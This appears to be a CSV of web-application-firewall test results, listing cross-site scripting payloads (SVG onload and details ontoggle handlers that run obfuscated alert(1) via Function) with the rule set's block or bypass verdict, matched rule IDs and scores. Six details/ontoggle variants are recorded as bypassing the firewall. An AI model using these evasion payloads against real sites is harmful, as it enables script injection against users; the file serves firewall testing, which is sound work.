index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
19,<svg onload=Function(atob('YWxlcnQoMSk='))()>,0,1,block,4,"941100,941120,941160,949110","v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,45t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628753158.536280
20,<svg onload=new(Function)(atob('YWxlcnQoMSk='))()>,0,1,block,5,"933210,941100,941120,941160,949110","o15,34v216,50t:urlDecode,t:replaceComments,t:compressWhitespace || v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628753154.212962
33,"<svg onload=Function.call(null,atob('YWxlcnQoMSk='))()>",0,1,block,4,"941100,941120,941160,949110","v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628754292.898467
34,"<svg onload=Function.apply(null,[atob('YWxlcnQoMSk=')])()>",0,1,block,4,"941100,941120,941160,949110","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628754255.321959
196,"<svg onload=""Function(atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628767499.325254
201,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628767833.216053
203,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open>,0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628767932.324473
204,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open>,0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768062.380576
206,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768251.085815
207,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()>,0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762876836.282879
208,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'>,0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628768380.379899
